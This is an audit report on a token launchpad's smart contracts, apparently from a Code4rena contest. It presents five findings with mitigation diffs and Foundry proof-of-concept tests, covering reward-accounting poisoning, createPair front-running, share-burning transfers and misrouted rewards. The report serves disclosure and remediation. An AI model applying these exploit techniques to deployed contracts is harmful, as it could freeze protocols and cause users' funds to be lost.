# [gte-perps-and-launchpad Report](https://code4rena.com/reports/2025-08-gte-perps-and-launchpad)

| ID | Title |
|:--:|:---|
| [H-1](#h-1-asset-mismatch-vulnerability-in-distributoraddrewards) | Asset Mismatch Vulnerability in `Distributor.addRewards()` |
| [M-1](#m-1front-running-createpair-leads-to-permanent-failure-of-token-graduation) | Front-Running `createPair()` Leads to Permanent Failure of Token Graduation |
| [M-2](#m-2standard-transfer-unexpectedly-burns-users-fee-sharing-stakes-breaking-composability) | Standard `transfer()` Unexpectedly Burns User's Fee-Sharing Stakes, Breaking Composability |
| [M-3](#m-3-passive-reward-settlement-locks-user-rewards-in-launchpad-contract) | Passive reward settlement locks user rewards in Launchpad contract |
| [L-1](#l-1flawed-fund-sourcing-in-_swapremaining-causes-dos-and-potential-fund-misappropriation) | Flawed Fund Sourcing in `_swapRemaining()` Causes DoS and Potential Fund Misappropriation |

# [H-1] Asset Mismatch Vulnerability in `Distributor.addRewards()`
https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Distributor.sol#L106

## Finding description and impact

The vulnerability lies in the `addRewards()`:
```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
```
If the same token address is supplied for both `token0` and `token1` (e.g., `addRewards(baseToken, baseToken, 0, attackAmount)`), the function behaves inconsistently.
It loads the correct reward pool state using `token0`, but later relies on the user-provided `token1` as the `quoteAsset`. This causes the attacker’s `baseToken` deposit to be incorrectly recorded as `quoteToken` rewards in the pool ledger.

### Impact

1. Permanent Denial-of-Service (DoS): The attack corrupts the consistency between pool-level and global reward accounting. As a result, any call to claimRewards triggers an invariant check (ClaimAmountExceedsTotalPendingRewards) and reverts permanently. The reward pool’s core functionality becomes irrecoverably broken.
2. Insolvency: The contract’s accounting system believes it owes users rewards in quoteToken, but its actual balance contains none of those assets.
3. Loss of User Trust: Since the reward distribution mechanism is central to the protocol, a failure of this magnitude severely undermines confidence in the system.

- Severity: Critical – The attack permanently breaks the reward pool, making reward distribution impossible and undermining the protocol’s core functionality.
- Likelihood: High – Exploitation only requires passing the same token for both parameters in addRewards(), making it trivial to execute.

## Recommended mitigation steps

Add a validation at the start of the addRewards() function to reject identical tokens:
```diff
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
+   if (token0 == token1) revert SameTokensProvided(); // Or a similar custom error
    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) = (token0, token1, amount0, amount1);
```

## POC

An attacker can poison the rewards accounting by calling `addRewards(baseToken, baseToken, 0, amount)`. The pool is loaded by `token0` but later uses `token1` as the `quoteAsset`, so the attacker’s baseToken deposit is recorded as quoteToken rewards — causing accounting corruption, insolvency and permanent DoS of the reward pool.

Copy the PoC into test/launchpad/Distributor.t.sol, then run:
`forge test --mt test_PoC_RewardInflationAndClaimFailure -vv`

```solidity
    function test_PoC_RewardInflationAndClaimFailure() public {
        // --- 1. Setup ---
        // Create a rewards pair and give a staker (userA) a single share.
        vm.startPrank(launchpad);
        d.createRewardsPair(baseToken, quoteToken);
        d.increaseStake(baseToken, userA, 1);
        vm.stopPrank();

        // Log and verify the pool is empty before the attack.
        uint256 quoteRewardsBefore = d.getRewardsPoolData(baseToken).pendingQuoteRewards;
        console.log("Quote Token Rewards Before Exploit:", quoteRewardsBefore);
        assertEq(quoteRewardsBefore, 0);

        // --- 2. Exploit ---
        uint256 exploitAmount = 1 ether;
        deal(baseToken, userA, exploitAmount);

        // Attacker calls addRewards with two identical tokens to poison the reward pool's accounting.
        vm.startPrank(userA);
        MockERC20(baseToken).approve(address(d), exploitAmount);
        d.addRewards(baseToken, baseToken, 0, uint128(exploitAmount));
        vm.stopPrank();

        // --- 3. Verify Consequence ---
        // Log and assert the internal accounting for quoteToken rewards was successfully inflated.
        uint256 quoteRewardsAfter = d.getRewardsPoolData(baseToken).pendingQuoteRewards;
        console.log("Quote Token Rewards After Exploit: ", quoteRewardsAfter);
        assertEq(quoteRewardsAfter, exploitAmount, "FAIL: Quote rewards were not inflated.");

        // Assert the contract is insolvent: it owes quoteToken rewards it does not possess.
        assertEq(MockERC20(quoteToken).balanceOf(address(d)), 0, "CRITICAL: Contract holds no actual quoteToken to pay rewards.");

        // Prove the ultimate failure: attempting to claim these phantom rewards reverts,
        // as the contract cannot fulfill the transfer.
        vm.expectRevert();
        vm.prank(userA);
        d.claimRewards(baseToken);
    }
```

# [M-1]Front-Running `createPair()` Leads to Permanent Failure of Token Graduation
https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol#L33

## Finding description and impact

The custom Uniswap V2 Factory (`GTELaunchpadV2PairFactory.sol`) contains a vulnerability in its `createPair()` function that allows for a front-running attack, leading to a permanent Denial of Service (DoS) for a token's "graduation" process.
At the beginning of the function, it performs the following check:
```solidity
if (getPair[token0][token1] != address(0)) revert("UniswapV2: PAIR_EXISTS");
```
This design allows an attacker to front-run the launchpad’s graduation process by calling `createPair()` for the same (token, quoteToken) pair before the official graduation transaction is executed.
When the attacker calls `createPair()`, a pair contract is deployed (with different initialization parameters than the legitimate one), and the factory’s `getPair[token0][token1]` mapping is updated with the attacker’s pair address.
When the legitimate Launchpad contract later attempts to call `createPair()`, the function immediately reverts due to the `PAIR_EXISTS` check, permanently blocking the graduation process.

### Impact

1. Permanent Denial of Service (Critical): The token’s graduation is permanently blocked — the Launchpad cannot create the official AMM pair because `getPair` is already set.
2. Bricked Token / Untradable: The token can never receive its official AMM liquidity pool on GTE and becomes effectively unlaunchable via the platform.
3. Locked Liquidity / Stuck Funds: Quote assets collected during bonding (intended as initial liquidity) cannot be deployed, leaving project and user funds unusable.
4. High Reputational & Business Damage: Breaks the fundamental promise of the Launchpad; undermines trust and can cause serious platform-wide fallout.
5. Persistence: Because the mapping is write-once for that token pair key, the DoS is persistent until manual remediation (on-chain migration or factory changes).

- Severity: Critical — A successful exploit causes permanent DoS of a token’s graduation: the token cannot obtain the intended AMM liquidity and funds raised during bonding cannot be deployed.
- Likelihood: High — The attack is a standard front-running of createPair; it requires no privileges and can be executed by any actor monitoring the mempool.

## Recommended mitigation steps

1. Restrict `createPair()` so that only the trusted Launchpad contract can create pairs for tokens under its management.
2. Alternatively, remove the assumption that `getPair()` is always authoritative, and add stricter initialization checks to ensure the created pair matches the expected launchpad parameters.
3. Consider precomputing the expected pair address (via create2) and verifying it during graduation, instead of blindly relying on `getPair`.

## POC

Copy the PoC into test/launchpad/Launchpad.t.sol, then run:
`forge test --mt test_FrontrunCreatePair_CausesGraduateToFail -vv`

The test imports the vulnerable GTELaunchpadV2PairFactory and injects UniswapV2 factory bytecode at uniV2Factory via vm.etch

```solidity
import {GTELaunchpadV2PairFactory} from "contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol"; // <- vulnerable factory used in PoC

contract LaunchpadTest is Test {
    using FixedPointMathLib for uint256;

    ERC1967Factory factory;
    Launchpad launchpad;
    address distributor;
    IBondingCurveMinimal curve;
    LaunchpadLPVault launchpadLPVault;

    ERC20Harness quoteToken;
    MockUniV2Router uniV2Router;
    address uniV2Factory; // <- made a state var so PoC can reference/manipulate the factory address

    address owner = makeAddr("owner");
    address user = makeAddr("user");
    address dev = makeAddr("dev");

    uint256 constant MIN_BASE_AMOUNT = 100_000_000;

    address token;

    uint256 BONDING_SUPPLY;
    uint256 TOTAL_SUPPLY;

    function setUp() public {
        quoteToken = new ERC20Harness("Quote", "QTE");

        factory = new ERC1967Factory();

        uniV2Factory = makeAddr("factory");
        vm.etch(uniV2Factory, UniV2Bytecode.UNIV2_FACTORY);

        uniV2Router = new MockUniV2Router(uniV2Factory);

        bytes32 launchpadSalt = bytes32(abi.encode("GTE.V1.TESTNET.LAUNCHPAD", owner));

        launchpad = Launchpad(factory.predictDeterministicAddress(launchpadSalt));

        address c_logic = address(new SimpleBondingCurve(address(launchpad)));
        address v_logic = address(new LaunchpadLPVault());

        curve = SimpleBondingCurve(factory.deploy(address(c_logic), owner));
        launchpadLPVault = LaunchpadLPVault(factory.deploy(address(v_logic), owner));

        address clobManager = makeAddr("clob manager");
        address operatorAddr = makeAddr("operator");
        vm.mockCall(
            operatorAddr,
            abi.encodeWithSelector(IOperatorPanel.getOperatorRoleApprovals.selector, user, address(0)),
            abi.encode(0)
        );

        distributor = address(new MockDistributor());
        vm.label(distributor, "MOCK_DISTRIBUTOR");

        address l_logic =
            address(new Launchpad(address(uniV2Router), address(0), clobManager, operatorAddr, distributor));

        vm.prank(owner);
        Launchpad(
            factory.deployDeterministicAndCall({
                implementation: l_logic,
                admin: owner,
                salt: launchpadSalt,
                data: abi.encodeCall(
                    Launchpad.initialize,
                    (
                        owner,
                        address(quoteToken),
                        address(curve),
                        address(launchpadLPVault),
                        abi.encode(200_000_000 ether, 10 ether)
                    )
                )
            })
        );

        token = _launchToken();

        BONDING_SUPPLY = curve.bondingSupply(token);
        TOTAL_SUPPLY = curve.totalSupply(token);

        vm.startPrank(user);
        quoteToken.approve(address(launchpad), type(uint256).max);
        ERC20Harness(token).approve(address(launchpad), type(uint256).max);
        vm.stopPrank();
    }

    function _launchToken() internal returns (address) {
            uint256 fee = launchpad.launchFee();
            deal(dev, 30 ether);

            vm.prank(dev);
            return launchpad.launch{value: fee}("TestToken", "TST", "https://testtoken.com");
    }

    function test_FrontrunCreatePair_CausesGraduateToFail() public {
        // Simulate a malicious user front-running the creation of a pair
        vm.startPrank(user);
        address maliciousPair = GTELaunchpadV2PairFactory(uniV2Factory).createPair(token, address(quoteToken));
        vm.stopPrank();

        // Calculate the total amount of quote tokens required to graduate
        // (i.e., purchase the entire bondingSupply)
        uint256 bondingSupply = curve.bondingSupply(token);
        uint256 quoteNeededForGraduation = curve.quoteQuoteForBase(token, bondingSupply, true);

        // Ensure the malicious pair is created successfully
        assertNotEq(maliciousPair, address(0), "Malicious pair address should not be zero.");
        console2.log("", maliciousPair);
        assertEq(
            GTELaunchpadV2PairFactory(uniV2Factory).getPair(token, address(quoteToken)),
            maliciousPair,
            "Malicious pair should exist in factory."
        );

        // Mint quote tokens to the user and approve spending for the launchpad
        quoteToken.mint(user, quoteNeededForGraduation);
        vm.startPrank(user);
        quoteToken.approve(address(launchpad), type(uint256).max);

        // Expectation:
        // Because the pair was front-run and created with malicious initialization parameters,
        // the graduation process (liquidity provision / pair creation) will revert.
        vm.expectRevert();
        launchpad.buy(
            ILaunchpad.BuyData({
                account: user,
                token: token,
                recipient: user,
                amountOutBase: bondingSupply,
                maxAmountInQuote: quoteNeededForGraduation
            })
        );
        vm.stopPrank();
    }
```


# [M-2]Standard `transfer()` Unexpectedly Burns User's Fee-Sharing Stakes, Breaking Composability
https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/LaunchToken.sol#L106

## Finding description and impact

The LaunchToken contract overrides the standard `_beforeTokenTransfer()` hook to include a destructive, non-standard side-effect. After graduation, once transfers are unlocked, any call to `transfer()` or `transferFrom()` by a user (not the Launchpad) automatically triggers `_decreaseFeeShares()`.
```solidity
// In LaunchToken.sol
function _beforeTokenTransfer(address from, address to, uint256 amount) internal override {
    // ...
    // This line is triggered on every user-to-user transfer post-graduation
    if (from != launchpad) _decreaseFeeShares(from, amount);
```
This mechanism burns a quantity of the sender's `bondingShare` equal to the amount of tokens transferred. While this appears to be the intended design to eventually deplete the `totalFeeShare` and automatically terminate the rewards program, the implementation choice is unsafe.
The core issue is that this design conflates two completely distinct user intents:
1. Transferring an asset: A standard, everyday operation.
2. Unstaking a position: A deliberate action to exit a rewards system.
The project documentation fails to mention this critical and highly unusual behavior. Consequently, users are unlikely to realize that performing a simple transfer will result in the irreversible loss of their valuable fee-sharing rights.

### Impact

This flaw directly harms users and undermines the token’s utility:
1. Unexpected Loss of Value – Ordinary transfers (to another wallet, an exchange, or a friend) irreversibly reduce a user’s bondingShare, which represents their right to protocol fees, without warning or consent.
2. Broken Composability – The transfer function breaks ERC20 assumptions, making the token unsafe to integrate:
    - DEXs: Adding liquidity burns shares.
    - Lending Platforms: Collateral deposits burn shares.
    - Multi-sigs/DAOs: Internal transfers can destroy treasury stakes.
3. Trust Erosion – This undocumented behavior will likely surprise users, as routine transfers may unexpectedly reduce their staking positions, undermining trust in both the token and the Launchpad.

- Severity: High – Users can permanently lose staking rights through routine transfers, breaking ERC20 composability.
- Likelihood: High – The issue is triggered by normal usage (transfer, transferFrom), making it almost certain to occur in practice.

## Recommended mitigation steps

1. Remove the Destructive Hook: In _beforeTokenTransfer(), remove the logic that burns shares. This restores the transfer() function to its expected, safe behavior.
```diff
-   if (from != launchpad) _decreaseFeeShares(from, amount);
```
1. Introduce an Explicit Unstaking Function: To allow the rewards program to terminate as intended, create a new, separate function that users must explicitly call. This makes the user's intent clear and prevents accidental value loss.
2. Clearly Document All Token Mechanics: All non-standard token behaviors should be clearly documented in user-facing materials. Users must be able to understand exactly how the token they are holding works, especially when it deviates from established standards.

## POC

The PoC proves that thisleads to an unintended and unfair value loss. When a user who holds both genesis and non-genesis tokens makes a transfer, the `_decreaseFeeShares()` function is indiscriminately triggered. This results in the user's staking shares being burned, even if the tokens being transferred were acquired stake-free from the secondary market, causing an unexpected and permanent loss of their initial staking investment.

Copy the PoC into test/launchpad/Launchpad.t.sol, then run:
`forge test --mt test_PoC_SharesReducedWhenUsersTransferAfterGraduation -vv`
```solidity
    function test_PoC_SharesReducedWhenUsersTransferAfterGraduation() public {
        address userA = makeAddr("userA");
        address userB = makeAddr("userB");

        // --- Step1: User A buys a small amount (receives genesis-backed tokens + shares) ---
        uint256 buyAmountA = 1 ether;
        uint256 quoteNeededA = curve.quoteQuoteForBase(token, buyAmountA, true);
        quoteToken.mint(userA, quoteNeededA);
        vm.startPrank(userA);
        quoteToken.approve(address(launchpad), type(uint256).max);
        launchpad.buy(ILaunchpad.BuyData(userA, token, userA, buyAmountA, quoteNeededA));
        vm.stopPrank();

        // --- Step2: User B buys the remaining supply and triggers graduation ---
        uint256 remaining = BONDING_SUPPLY - curve.baseSoldFromCurve(token);
        uint256 quoteNeededB = curve.quoteQuoteForBase(token, remaining, true);
        quoteToken.mint(userB, quoteNeededB);
        vm.startPrank(userB);
        quoteToken.approve(address(launchpad), type(uint256).max);
        launchpad.buy(ILaunchpad.BuyData(userB, token, userB, remaining, type(uint256).max));
        vm.stopPrank();

        uint256 shareB_before = LaunchToken(token).bondingShare(userB); // Record User B's shares right after graduation

        // --- Step3: User A transfers some tokens to User B ---
        uint256 amountTo = 0.5 ether;
        vm.prank(userA);
        LaunchToken(token).transfer(userB, amountTo);

        // --- Step4: User B transfers the same amount back to User A ---
        vm.prank(userB);
        LaunchToken(token).transfer(userA, amountTo);
    
        uint256 shareB_after = LaunchToken(token).bondingShare(userB); // Record User B's shares after the transfers

        // --- Step5: Validate that shares have unexpectedly decreased ---
        assertLt(shareB_after, shareB_before, "BUG: B's shares reduced after graduation transfers");
        console.log("Step 1: User B's shares BEFORE his transfer:", shareB_before);
        console.log("Step 3: User B's shares AFTER his transfer: ", shareB_after);
    }
```

# [M-3] Passive reward settlement locks user rewards in Launchpad contract
https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Distributor.sol#L167

## Finding description and impact

The internal function `_distributeAssets()` misuses `msg.sender` as the reward recipient. While this works in `claimRewards()`, it fails when invoked indirectly through `increaseStake()` and `decreaseStake()`, where `msg.sender` is always the Launchpad contract due to the `onlyLaunchpad` modifier. As a result, rewards are transferred to the Launchpad contract instead of the intended user.
Since the Launchpad contract currently lacks any function to withdraw arbitrary tokens, these rewards remain permanently inaccessible to users.

```solidity
    function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
        if (baseAmount > 0) {
            _decreaseTotalPending(base, baseAmount);
            base.safeTransfer(msg.sender, baseAmount);
        }
        if (quoteAmount > 0) {
            _decreaseTotalPending(quote, quoteAmount);
            quote.safeTransfer(msg.sender, quoteAmount);
```

- Severity: High - The vulnerability directly causes a permanent loss of user funds under normal, expected protocol operations (e.g., token transfers that trigger staking updates). This is not an edge case but a flaw in a primary reward distribution path.
- Likelihood: High - The vulnerable path is triggered by the most common user interactions with LaunchToken (transferring, staking, unstaking). Any user actively participating in the ecosystem is highly likely to have their rewards settled via this flawed mechanism, leading to guaranteed fund loss.
  
## Recommended mitigation steps

The fundamental issue is the reliance on a context-dependent `msg.sender`. The fix is to make the recipient explicit in all reward distribution paths.

Modify `_distributeAssets()` to accept a recipient:

```diff
-   function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
+   function _distributeAssets(address recipient, address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
```

And use this recipient for the transfer: 

```diff
-   base.safeTransfer(msg.sender, baseAmount);
+   base.safeTransfer(recipient, baseAmount);
-   quote.safeTransfer(msg.sender, quoteAmount);
+   quote.safeTransfer(recipient, quoteAmount);
```

## POC

This PoC demonstrates that when rewards are passively settled via `increaseStake()`, they are incorrectly sent to the Launchpad contract instead of the user. As a result, the user’s pending rewards are cleared but their balance does not increase, while the Launchpad’s balance increases instead.

Copy the PoC into test/launchpad/Distributor.t.sol, then run:
`forge test --mt test_PoC_RewardsLockedInLaunchpadOnPassiveSettlement -vv`

```solidity
    function test_PoC_RewardsLockedInLaunchpadOnPassiveSettlement() public {
        // --- 1. Setup ---
        // Create rewards pair and give userA 1 share.
        vm.startPrank(launchpad);
        d.createRewardsPair(baseToken, quoteToken);
        d.increaseStake(baseToken, userA, 1);
        vm.stopPrank();

        // Inject quote rewards into the pool
        deal(quoteToken, address(this), 10 ether);
        MockERC20(quoteToken).approve(address(d), 10 ether);
        d.addRewards(baseToken, quoteToken, 0, 10 ether);

        // Confirm userA has pending rewards before settlement
        (, uint256 pendingQuoteBefore) = d.getPendingRewards(baseToken, userA);
        console.log("Pending rewards for userA before settlement:", pendingQuoteBefore);

        uint256 balLaunchpadBefore = MockERC20(quoteToken).balanceOf(launchpad);
        uint256 balUserABefore = MockERC20(quoteToken).balanceOf(userA);
        console.log("Launchpad balance before settlement:", balLaunchpadBefore);
        console.log("userA balance before settlement:", balUserABefore);

        // --- 2. Vulnerable path: passive settlement ---
        vm.prank(launchpad);
        d.increaseStake(baseToken, userA, 1);

        // --- 3. Verify results ---
        (, uint256 pendingQuoteAfter) = d.getPendingRewards(baseToken, userA);
        console.log("Pending rewards for userA after settlement:", pendingQuoteAfter);

        uint256 balLaunchpadAfter = MockERC20(quoteToken).balanceOf(launchpad);
        uint256 balUserAAfter = MockERC20(quoteToken).balanceOf(userA);
        console.log("Launchpad balance after passive settlement:", balLaunchpadAfter);
        console.log("userA balance after passive settlement:", balUserAAfter);

        // --- 4. Assertions ---
        assertEq(balLaunchpadAfter, 10 ether, "expected rewards stuck in Launchpad");
        assertEq(balUserAAfter, 0, "userA did not receive rewards");
        assertEq(pendingQuoteAfter, 0, "pending rewards should have been settled but incorrectly redirected");
    }
```

# [L-1]Flawed Fund Sourcing in `_swapRemaining()` Causes DoS and Potential Fund Misappropriation
https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Launchpad.sol#L536

## Finding description and impact

The `_swapRemaining()` function, responsible for handling post-graduation swaps, contains a flawed fund-sourcing mechanism. It incorrectly uses `msg.sender` (the operator) as the source of funds instead of the actual user (`buyData.account`). This breaks the intended separation between the operator acting as a delegate and the user as the fund owner.
```solidity
data.quote.safeTransferFrom(msg.sender, address(this), data.quoteAmount);
```

This flaw leads to two distinct outcomes:

1. Denial of Service: When executed by an operator without approval for the quote token, the `safeTransferFrom(msg.sender, …)` call reverts, causing the entire buy transaction to fail and disabling operator functionality for graduation.
2. Fund Misappropriation: If an operator has approved the contract, the function will source funds from the operator’s wallet to complete the user’s purchase. This results in a direct financial loss for the operator, and in failure cases, can also leave the user with an incomplete order without a proper refund.

## Recommended mitigation steps

To resolve this vulnerability, the `_swapRemaining()` function must source funds from the actual user (`buyData.account`) instead of the operator (`msg.sender`).  
This can be achieved by passing `buyData.account` down through the internal call chain.

1. Pass `buyData.account` to `_createPairAndSwapRemaining()`
```diff
// In _graduate()
-   _createPairAndSwapRemaining({
-       //...
-       recipient: buyData.recipient
+   _createPairAndSwapRemaining({
+       //...
+       recipient: buyData.recipient,
+       fundOwner: buyData.account
```

2. Pass `fundOwner` to `_swapRemaining()`
```diff
// In _createPairAndSwapRemaining()
-   (, uint256 quoteUsed) = _swapRemaining(d);
+   (, uint256 quoteUsed) = _swapRemaining(d, fundOwner);
```

3. Update `_swapRemaining()` to Use `fundOwner`
```diff
-   function _swapRemaining(SwapRemainingData memory data) internal returns (uint256, uint256) {
+   function _swapRemaining(SwapRemainingData memory data, address fundOwner) internal returns (uint256, uint256) {

-       data.quote.safeTransferFrom(msg.sender, address(this), data.quoteAmount);
+       data.quote.safeTransferFrom(fundOwner, address(this), data.quoteAmount);

        // ...
        try { /* ... */ } catch {
-           data.quote.safeTransfer(msg.sender, data.quoteAmount);
+           data.quote.safeTransfer(fundOwner, data.quoteAmount);
```

## POC

Copy the PoC into test/launchpad/Launchpad.t.sol, then run:
`forge test --mt test_PoC_OperatorPostGraduateSwapFails -vvvv`

```solidity
contract LaunchpadTest is Test {
    using FixedPointMathLib for uint256;

    ERC1967Factory factory;
    Launchpad launchpad;
    address distributor;
    IBondingCurveMinimal curve;
    LaunchpadLPVault launchpadLPVault;

    ERC20Harness quoteToken;
    MockUniV2Router uniV2Router;
    address uniV2Factory; 

    address owner = makeAddr("owner");
    address user = makeAddr("user");
    address dev = makeAddr("dev");
    address operatorAddr; // 

    uint256 constant MIN_BASE_AMOUNT = 100_000_000;

    address token;

    uint256 BONDING_SUPPLY;
    uint256 TOTAL_SUPPLY;

    function setUp() public {
        quoteToken = new ERC20Harness("Quote", "QTE");

        factory = new ERC1967Factory();

        uniV2Factory = makeAddr("factory");
        vm.etch(uniV2Factory, UniV2Bytecode.UNIV2_FACTORY);

        uniV2Router = new MockUniV2Router(uniV2Factory);

        bytes32 launchpadSalt = bytes32(abi.encode("GTE.V1.TESTNET.LAUNCHPAD", owner));

        launchpad = Launchpad(factory.predictDeterministicAddress(launchpadSalt));

        address c_logic = address(new SimpleBondingCurve(address(launchpad)));
        address v_logic = address(new LaunchpadLPVault());

        curve = SimpleBondingCurve(factory.deploy(address(c_logic), owner));
        launchpadLPVault = LaunchpadLPVault(factory.deploy(address(v_logic), owner));

        address clobManager = makeAddr("clob manager");
        operatorAddr = makeAddr("operator"); // 
        vm.mockCall(
            operatorAddr,
            abi.encodeWithSelector(IOperatorPanel.getOperatorRoleApprovals.selector, user, address(0)),
            abi.encode(0)
        );

        distributor = address(new MockDistributor());
        vm.label(distributor, "MOCK_DISTRIBUTOR");

        address l_logic =
            address(new Launchpad(address(uniV2Router), address(0), clobManager, operatorAddr, distributor));

        vm.prank(owner);
        Launchpad(
            factory.deployDeterministicAndCall({
                implementation: l_logic,
                admin: owner,
                salt: launchpadSalt,
                data: abi.encodeCall(
                    Launchpad.initialize,
                    (
                        owner,
                        address(quoteToken),
                        address(curve),
                        address(launchpadLPVault),
                        abi.encode(200_000_000 ether, 10 ether)
                    )
                )
            })
        );

        token = _launchToken();

        BONDING_SUPPLY = curve.bondingSupply(token);
        TOTAL_SUPPLY = curve.totalSupply(token);

        vm.startPrank(user);
        quoteToken.approve(address(launchpad), type(uint256).max);
        ERC20Harness(token).approve(address(launchpad), type(uint256).max);
        vm.stopPrank();
    }

    function _launchToken() internal returns (address) {
        uint256 fee = launchpad.launchFee();
        deal(dev, 30 ether);

        vm.prank(dev);
        return launchpad.launch{value: fee}("TestToken", "TST", "https://testtoken.com");
    }

    function test_PoC_OperatorPostGraduateSwapFails() public {
        // === Step 1: Define roles and grant operator permissions ===
        address userAlice = makeAddr("userAlice");
        address operatorBob = makeAddr("operatorBob");

        // Mock OperatorPanel to authorize operatorBob for userAlice.
        // Ensures operator-based purchase is recognized as valid.
        uint256 LAUNCHPAD_FILL_ROLE = 1; 
        vm.mockCall(
            operatorAddr,
            abi.encodeWithSelector(IOperatorPanel.getOperatorRoleApprovals.selector, userAlice, operatorBob),
            abi.encode(LAUNCHPAD_FILL_ROLE)
        );

        // === Step 2: Setup graduation + remainder swap scenario ===
        // Based on the existing `test_PostGraduate_Swap`.
        uint256 bondedBase = curve.bondingSupply(token); // Graduation requires this exact amount
        uint256 bondedQuote = curve.quoteQuoteForBase(token, bondedBase, true);

        uint256 baseLiquidity = curve.totalSupply(token) - bondedBase;
        
        // Alice intends to buy an additional amount from the AMM immediately after graduation.
        uint256 ammBase = 10 ether; // Extra tokens targeted from the AMM pool after graduation
        uint256 ammQuote = uniV2Router.getAmountIn(ammBase, bondedQuote, baseLiquidity);

        // Total purchase amount, forcing a remainder swap after graduation.
        uint256 totalBaseToBuy = bondedBase + ammBase;
        uint256 maxQuoteToPay = bondedQuote + ammQuote;

        // Alice funds and approves the Launchpad.
        quoteToken.mint(userAlice, maxQuoteToPay);
        vm.startPrank(userAlice);
        quoteToken.approve(address(launchpad), maxQuoteToPay);
        vm.stopPrank();

        // === Step 3: Trigger the issue ===
        // Expect revert due to insufficient allowance for the operator in `_swapRemaining`.
        vm.expectRevert();

        vm.prank(operatorBob);
        launchpad.buy(ILaunchpad.BuyData({
            account: userAlice,         // Actual owner of the funds
            token: token,
            recipient: userAlice,
            amountOutBase: totalBaseToBuy,
            maxAmountInQuote: maxQuoteToPay
        }));
    }
```